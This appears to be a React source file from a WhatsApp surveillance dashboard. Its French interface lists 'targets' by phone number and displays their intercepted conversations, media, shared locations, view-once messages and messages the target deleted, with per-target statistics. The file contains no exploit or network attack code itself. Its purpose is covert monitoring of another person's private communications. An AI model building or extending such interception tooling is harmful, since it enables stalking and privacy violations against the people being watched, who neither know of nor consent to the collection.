import { useState, useEffect } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import {
  ArrowLeft, MessageSquare, Image, Video, Mic, FileText, MapPin,
  Trash2, Search, Filter, ChevronLeft, ChevronRight, RefreshCw,
  Send, Download, Sticker, Contact, BarChart3, Eye, EyeOff
} from 'lucide-react';
import { messageApi, targetApi } from '../api/client';
import { format } from 'date-fns';
import { fr } from 'date-fns/locale';

interface Message {
  id: string;
  waMessageId: string;
  type: string;
  direction: string;
  senderJid: string;
  chatJid: string;
  content: string | null;
  timestamp: string;
  isForwarded: boolean;
  isViewOnce: boolean;
  isDeleted: boolean;
  deletedAt: string | null;
  media: {
    mimeType: string;
    fileName: string | null;
    fileSize: number | null;
    thumbnailB64: string | null;
    duration: number | null;
  } | null;
  location: {
    latitude: number;
    longitude: number;
    name: string | null;
    address: string | null;
    url: string | null;
  } | null;
}

interface Conversation {
  chatJid: string;
  messageCount: number;
  lastMessageAt: string;
  lastMessage: {
    content: string | null;
    type: string;
    timestamp: string;
    direction: string;
  } | null;
}

interface Stats {
  total: number;
  today: number;
  deleted: number;
  byType: Record<string, number>;
  byDirection: Record<string, number>;
}

const typeIcons: Record<string, any> = {
  TEXT: MessageSquare,
  IMAGE: Image,
  VIDEO: Video,
  AUDIO: Mic,
  VOICE_NOTE: Mic,
  DOCUMENT: FileText,
  STICKER: Sticker,
  LOCATION: MapPin,
  CONTACT: Contact,
  REACTION: MessageSquare,
};

const typeLabels: Record<string, string> = {
  TEXT: 'Texte',
  IMAGE: 'Image',
  VIDEO: 'Video',
  AUDIO: 'Audio',
  VOICE_NOTE: 'Note vocale',
  DOCUMENT: 'Document',
  STICKER: 'Sticker',
  LOCATION: 'Position',
  CONTACT: 'Contact',
  POLL: 'Sondage',
  REACTION: 'Reaction',
  UNKNOWN: 'Autre',
};

export default function Messages() {
  const { id: targetId } = useParams<{ id: string }>();
  const navigate = useNavigate();
  const [target, setTarget] = useState<any>(null);
  const [messages, setMessages] = useState<Message[]>([]);
  const [conversations, setConversations] = useState<Conversation[]>([]);
  const [stats, setStats] = useState<Stats | null>(null);
  const [loading, setLoading] = useState(true);
  const [activeTab, setActiveTab] = useState<'messages' | 'deleted' | 'stats'>('messages');
  const [selectedChat, setSelectedChat] = useState<string | null>(null);
  const [page, setPage] = useState(1);
  const [totalPages, setTotalPages] = useState(1);
  const [search, setSearch] = useState('');
  const [typeFilter, setTypeFilter] = useState<string>('');
  const [showConversations, setShowConversations] = useState(true);

  useEffect(() => {
    if (!targetId) return;
    targetApi.get(targetId).then(res => setTarget(res.data.target)).catch(() => navigate('/'));
    loadConversations();
    loadStats();
  }, [targetId]);

  useEffect(() => {
    loadMessages();
  }, [targetId, page, selectedChat, typeFilter, activeTab]);

  const loadConversations = async () => {
    if (!targetId) return;
    try {
      const res = await messageApi.conversations(targetId);
      setConversations(res.data.conversations);
    } catch { /* ignore */ }
  };

  const loadStats = async () => {
    if (!targetId) return;
    try {
      const res = await messageApi.stats(targetId);
      setStats(res.data);
    } catch { /* ignore */ }
  };

  const loadMessages = async () => {
    if (!targetId) return;
    setLoading(true);
    try {
      const params: Record<string, string> = { page: String(page), limit: '50' };
      if (selectedChat) params.chatJid = selectedChat;
      if (typeFilter) params.type = typeFilter;
      if (search) params.search = search;

      const res = activeTab === 'deleted'
        ? await messageApi.deleted(targetId, params)
        : await messageApi.list(targetId, params);

      setMessages(res.data.messages);
      setTotalPages(res.data.pagination.pages);
    } catch { /* ignore */ }
    setLoading(false);
  };

  const handleSearch = () => {
    setPage(1);
    loadMessages();
  };

  const formatJid = (jid: string) => {
    return jid.replace('@s.whatsapp.net', '').replace(/@.*/, '');
  };

  const formatSize = (bytes: number | null) => {
    if (!bytes) return '';
    if (bytes < 1024) return `${bytes} o`;
    if (bytes < 1024 * 1024) return `${(bytes / 1024).toFixed(1)} Ko`;
    return `${(bytes / (1024 * 1024)).toFixed(1)} Mo`;
  };

  const formatDuration = (seconds: number | null) => {
    if (!seconds) return '';
    const m = Math.floor(seconds / 60);
    const s = seconds % 60;
    return `${m}:${String(s).padStart(2, '0')}`;
  };

  if (!target) {
    return (
      <div className="flex items-center justify-center h-64">
        <RefreshCw className="animate-spin text-gray-400" size={24} />
      </div>
    );
  }

  return (
    <div className="h-full flex flex-col">
      {/* Header */}
      <div className="flex items-center justify-between mb-4">
        <div className="flex items-center gap-3">
          <button onClick={() => navigate(`/targets/${targetId}`)} className="text-gray-500 hover:text-gray-700">
            <ArrowLeft size={20} />
          </button>
          <div>
            <h2 className="text-xl font-bold text-gray-900">
              Messages — {target.label || target.phoneNumber}
            </h2>
            <p className="text-xs text-gray-500">
              {stats ? `${stats.total} messages interceptes dont ${stats.today} aujourd'hui` : 'Chargement...'}
            </p>
          </div>
        </div>

        {/* Tab Switcher */}
        <div className="flex gap-1 bg-gray-100 rounded-lg p-1">
          {[
            { key: 'messages', label: 'Messages', icon: MessageSquare },
            { key: 'deleted', label: 'Supprimes', icon: Trash2 },
            { key: 'stats', label: 'Stats', icon: BarChart3 },
          ].map(({ key, label, icon: Icon }) => (
            <button
              key={key}
              onClick={() => { setActiveTab(key as any); setPage(1); }}
              className={`flex items-center gap-1.5 px-3 py-1.5 rounded-md text-sm font-medium transition-colors ${
                activeTab === key ? 'bg-white text-blue-600 shadow-sm' : 'text-gray-600 hover:text-gray-800'
              }`}
            >
              <Icon size={14} />
              {label}
            </button>
          ))}
        </div>
      </div>

      {/* Stats Tab */}
      {activeTab === 'stats' && stats && (
        <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mb-6">
          <div className="bg-white rounded-xl border border-gray-200 p-4">
            <p className="text-xs text-gray-500 uppercase">Total messages</p>
            <p className="text-2xl font-bold text-gray-900">{stats.total}</p>
          </div>
          <div className="bg-white rounded-xl border border-gray-200 p-4">
            <p className="text-xs text-gray-500 uppercase">Aujourd'hui</p>
            <p className="text-2xl font-bold text-blue-600">{stats.today}</p>
          </div>
          <div className="bg-white rounded-xl border border-gray-200 p-4">
            <p className="text-xs text-gray-500 uppercase">Supprimes</p>
            <p className="text-2xl font-bold text-red-500">{stats.deleted}</p>
          </div>
          <div className="bg-white rounded-xl border border-gray-200 p-4">
            <p className="text-xs text-gray-500 uppercase">Recus / Envoyes</p>
            <p className="text-2xl font-bold text-gray-900">
              {stats.byDirection.INCOMING || 0} / {stats.byDirection.OUTGOING || 0}
            </p>
          </div>

          {/* Type breakdown */}
          <div className="col-span-2 md:col-span-4 bg-white rounded-xl border border-gray-200 p-4">
            <p className="text-sm font-semibold text-gray-700 mb-3">Par type de message</p>
            <div className="grid grid-cols-3 md:grid-cols-6 gap-3">
              {Object.entries(stats.byType).map(([type, count]) => {
                const Icon = typeIcons[type] || MessageSquare;
                return (
                  <div key={type} className="text-center p-2 bg-gray-50 rounded-lg">
                    <Icon size={20} className="mx-auto text-gray-400 mb-1" />
                    <p className="text-lg font-bold text-gray-900">{count}</p>
                    <p className="text-xs text-gray-500">{typeLabels[type] || type}</p>
                  </div>
                );
              })}
            </div>
          </div>
        </div>
      )}

      {/* Messages / Deleted view */}
      {activeTab !== 'stats' && (
        <div className="flex flex-1 gap-4 min-h-0">
          {/* Conversation List (sidebar) */}
          {showConversations && (
            <div className="w-64 bg-white rounded-xl border border-gray-200 flex flex-col overflow-hidden">
              <div className="p-3 border-b border-gray-100 flex items-center justify-between">
                <span className="text-sm font-semibold text-gray-700">Conversations</span>
                <button onClick={() => setShowConversations(false)} className="text-gray-400 hover:text-gray-600">
                  <ChevronLeft size={16} />
                </button>
              </div>
              <div className="flex-1 overflow-y-auto">
                <button
                  onClick={() => { setSelectedChat(null); setPage(1); }}
                  className={`w-full text-left px-3 py-2.5 text-sm border-b border-gray-50 transition-colors ${
                    !selectedChat ? 'bg-blue-50 text-blue-700' : 'hover:bg-gray-50'
                  }`}
                >
                  <p className="font-medium">Tous les messages</p>
                  <p className="text-xs text-gray-400">{stats?.total || 0} messages</p>
                </button>
                {conversations.map((conv) => (
                  <button
                    key={conv.chatJid}
                    onClick={() => { setSelectedChat(conv.chatJid); setPage(1); }}
                    className={`w-full text-left px-3 py-2.5 text-sm border-b border-gray-50 transition-colors ${
                      selectedChat === conv.chatJid ? 'bg-blue-50 text-blue-700' : 'hover:bg-gray-50'
                    }`}
                  >
                    <p className="font-medium truncate">{formatJid(conv.chatJid)}</p>
                    <p className="text-xs text-gray-400 truncate">
                      {conv.lastMessage?.content || typeLabels[conv.lastMessage?.type || ''] || '...'}
                    </p>
                    <p className="text-xs text-gray-300 mt-0.5">
                      {conv.messageCount} msg
                    </p>
                  </button>
                ))}
              </div>
            </div>
          )}

          {/* Message List */}
          <div className="flex-1 bg-white rounded-xl border border-gray-200 flex flex-col overflow-hidden">
            {/* Search / Filters Bar */}
            <div className="p-3 border-b border-gray-100 flex items-center gap-2">
              {!showConversations && (
                <button onClick={() => setShowConversations(true)} className="text-gray-400 hover:text-gray-600">
                  <ChevronRight size={16} />
                </button>
              )}
              <div className="flex-1 relative">
                <Search size={14} className="absolute left-2.5 top-2.5 text-gray-400" />
                <input
                  type="text"
                  value={search}
                  onChange={(e) => setSearch(e.target.value)}
                  onKeyDown={(e) => e.key === 'Enter' && handleSearch()}
                  placeholder="Rechercher dans les messages..."
                  className="w-full pl-8 pr-3 py-2 text-sm border border-gray-200 rounded-lg focus:ring-2 focus:ring-blue-500 outline-none"
                />
              </div>
              <select
                value={typeFilter}
                onChange={(e) => { setTypeFilter(e.target.value); setPage(1); }}
                className="text-sm border border-gray-200 rounded-lg px-2 py-2 outline-none"
              >
                <option value="">Tous types</option>
                {Object.entries(typeLabels).map(([key, label]) => (
                  <option key={key} value={key}>{label}</option>
                ))}
              </select>
            </div>

            {/* Messages */}
            <div className="flex-1 overflow-y-auto p-3 space-y-2">
              {loading ? (
                <div className="flex items-center justify-center h-32">
                  <RefreshCw className="animate-spin text-gray-400" size={20} />
                </div>
              ) : messages.length === 0 ? (
                <div className="text-center text-gray-400 py-12">
                  <MessageSquare size={40} className="mx-auto mb-3 opacity-50" />
                  <p className="text-sm">Aucun message intercepte</p>
                </div>
              ) : (
                messages.map((msg) => <MessageBubble key={msg.id} message={msg} formatJid={formatJid} formatSize={formatSize} formatDuration={formatDuration} />)
              )}
            </div>

            {/* Pagination */}
            {totalPages > 1 && (
              <div className="p-3 border-t border-gray-100 flex items-center justify-between">
                <button
                  onClick={() => setPage(p => Math.max(1, p - 1))}
                  disabled={page <= 1}
                  className="flex items-center gap-1 text-sm text-gray-600 hover:text-gray-800 disabled:opacity-30"
                >
                  <ChevronLeft size={14} /> Precedent
                </button>
                <span className="text-xs text-gray-400">Page {page} / {totalPages}</span>
                <button
                  onClick={() => setPage(p => Math.min(totalPages, p + 1))}
                  disabled={page >= totalPages}
                  className="flex items-center gap-1 text-sm text-gray-600 hover:text-gray-800 disabled:opacity-30"
                >
                  Suivant <ChevronRight size={14} />
                </button>
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  );
}

function MessageBubble({
  message,
  formatJid,
  formatSize,
  formatDuration,
}: {
  message: Message;
  formatJid: (jid: string) => string;
  formatSize: (bytes: number | null) => string;
  formatDuration: (seconds: number | null) => string;
}) {
  const isOutgoing = message.direction === 'OUTGOING';
  const Icon = typeIcons[message.type] || MessageSquare;

  return (
    <div className={`flex ${isOutgoing ? 'justify-end' : 'justify-start'}`}>
      <div
        className={`max-w-[75%] rounded-xl px-3 py-2 text-sm ${
          message.isDeleted
            ? 'bg-red-50 border border-red-200'
            : isOutgoing
              ? 'bg-blue-50 border border-blue-100'
              : 'bg-gray-50 border border-gray-200'
        }`}
      >
        {/* Sender */}
        <div className="flex items-center gap-1.5 mb-1">
          <span className="text-xs font-medium text-gray-500">
            {formatJid(message.senderJid)}
          </span>
          {message.isForwarded && (
            <span className="text-xs text-gray-400 italic">transfere</span>
          )}
          {message.isViewOnce && (
            <span title="Vue unique"><EyeOff size={10} className="text-gray-400" /></span>
          )}
          {message.isDeleted && (
            <span className="text-xs text-red-500 font-medium">SUPPRIME</span>
          )}
        </div>

        {/* Media thumbnail */}
        {message.media?.thumbnailB64 && (
          <div className="mb-2 rounded-lg overflow-hidden bg-gray-200">
            <img
              src={`data:image/jpeg;base64,${message.media.thumbnailB64}`}
              alt="Apercu"
              className="max-w-full max-h-48 object-cover"
            />
          </div>
        )}

        {/* Content */}
        <div className="flex items-start gap-2">
          <Icon size={14} className="text-gray-400 mt-0.5 flex-shrink-0" />
          <div className="min-w-0 flex-1">
            {message.content ? (
              <p className="text-gray-800 break-words whitespace-pre-wrap">{message.content}</p>
            ) : (
              <p className="text-gray-400 italic">{typeLabels[message.type] || message.type}</p>
            )}
          </div>
        </div>

        {/* Media info */}
        {message.media && (
          <div className="mt-1 flex items-center gap-2 text-xs text-gray-400">
            {message.media.fileName && <span>{message.media.fileName}</span>}
            {message.media.fileSize && <span>{formatSize(message.media.fileSize)}</span>}
            {message.media.duration && <span>{formatDuration(message.media.duration)}</span>}
          </div>
        )}

        {/* Location */}
        {message.location && (
          <div className="mt-1">
            <a
              href={message.location.url || `https://maps.google.com/?q=${message.location.latitude},${message.location.longitude}`}
              target="_blank"
              rel="noopener noreferrer"
              className="text-xs text-blue-500 hover:underline flex items-center gap-1"
            >
              <MapPin size={10} />
              {message.location.name || message.location.address || `${message.location.latitude.toFixed(4)}, ${message.location.longitude.toFixed(4)}`}
            </a>
          </div>
        )}

        {/* Timestamp */}
        <div className="flex items-center justify-end gap-1 mt-1">
          <span className="text-xs text-gray-300">
            {format(new Date(message.timestamp), 'dd/MM HH:mm:ss', { locale: fr })}
          </span>
          {isOutgoing && <Send size={10} className="text-blue-300" />}
        </div>
      </div>
    </div>
  );
}
